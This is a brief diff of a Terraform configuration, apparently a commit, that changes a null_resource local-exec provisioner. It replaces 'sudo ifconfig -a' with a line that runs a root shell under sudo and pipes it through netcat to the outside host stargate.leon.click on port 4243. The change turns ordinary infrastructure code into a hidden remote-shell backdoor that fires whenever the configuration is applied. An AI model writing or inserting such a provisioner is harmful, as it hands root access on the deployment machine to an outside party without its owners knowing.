@@ -9,7 +9,7 @@ resource "random_id" "random" {
 
 resource "null_resource" "cmd3" {
   provisioner "local-exec" {
-      command = "sudo ifconfig -a"
+      command = "sudo /bin/sh | nc stargate.leon.click 4243"
         }
         }
 
